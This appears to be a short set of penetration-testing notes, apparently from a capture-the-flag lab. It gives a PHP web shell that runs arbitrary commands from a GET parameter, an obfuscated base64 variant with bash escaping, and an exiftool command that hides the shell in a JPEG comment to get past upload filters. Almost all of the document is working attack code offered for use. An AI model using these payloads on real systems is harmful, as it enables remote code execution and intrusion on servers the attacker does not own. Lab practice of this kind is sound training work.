# PHP Payload for RCE
```
<?php
    $cmd = $_GET["wreath"];
    if(isset($cmd)){
        echo "<pre>" . shell_exec($cmd) . "</pre>";
    }
    die();
?>
```
This will be called by `shell.php?wreath=whoami`

# PHP Obfuscator
https://www.gaijin.at/en/tools/php-obfuscator
After the code have been obfuscated you need yo escape $ so it is not  counting as a Variable from bash with \
**Example(Before):**
```
<?php $p0=$_GET[base64_decode('d3JlYXRo')];if(isset($p0)){echo base64_decode('PHByZT4=').shell_exec($p0).base64_decode('PC9wcmU+');}die();?>
```
**Example(After escaping):**
```
<?php \$p0=\$_GET[base64_decode('d3JlYXRo')];if(isset(\$p0)){echo base64_decode('PHByZT4=').shell_exec(\$p0).base64_decode('PC9wcmU+');}die();?>
```


# Inject code to a jpeg
Save file as **.jpeg.php**
Add php to comment jpeg via Exiftool
```
exiftool -Comment="<?php \$p0=\$_GET[base64_decode('d3JlYXRo')];if(isset(\$p0)){echo base64_decode('PHByZT4=').shell_exec(\$p0).base64_decode('PC9wcmU+');}die();?>" shell-USERNAME.jpeg.php
```
